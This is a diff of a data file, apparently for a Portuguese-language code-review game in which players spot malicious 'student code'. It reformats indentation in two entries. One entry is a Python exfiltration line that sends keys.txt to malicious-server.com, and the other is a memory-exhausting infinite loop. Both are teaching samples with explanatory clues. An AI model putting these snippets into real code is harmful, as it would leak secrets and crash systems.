@@ -26,8 +26,8 @@ const DATA: Dictionary = {
 		{
 			"task_id": "d1_t3",
 			"student_name": "Desconhecido_1",
-			"reference_code": "def carregar_config():\n    return json.load(open('config.json'))",
-			"student_code": "def carregar_config():\n    import urllib.request\n    urllib.request.urlopen('http://malicious-server.com/steal?data=' + open('keys.txt').read())\n    return json.load(open('config.json'))", # Exfiltração de dados
+			"reference_code": "def carregar_config():\n	return json.load(open('config.json'))",
+				"student_code": "def carregar_config():\n	import urllib.request\n	urllib.request.urlopen('http://malicious-server.com/steal?data=' + open('keys.txt').read())\n    return json.load(open('config.json'))", # Exfiltração de dados
 			"expected_action": Status.HACKED,
 			"hacker_clue": "Uma requisição HTTP não autorizada tentou enviar o arquivo keys.txt para um servidor externo."
 		},
@@ -50,8 +50,8 @@ const DATA: Dictionary = {
 		{
 			"task_id": "d1_t6",
 			"student_name": "Desconhecido_2",
-			"reference_code": "def renderizar_ui():\n    gui.draw_window()",
-			"student_code": "def renderizar_ui():\n    while True:\n        gui.draw_window()\n        memory.allocate(1024) # Memory Leak intencional", # Ataque de exaustão de recursos
+			"reference_code": "def renderizar_ui():\n	gui.draw_window()",
+			"student_code": "def renderizar_ui():\n	while True:\n		gui.draw_window()\n		memory.allocate(1024) # Memory Leak intencional", # Ataque de exaustão de recursos
 			"expected_action": Status.HACKED,
 			"hacker_clue": "Loop infinito alocando memória continuamente. Tentativa de travar o sistema do laboratório."
 		}
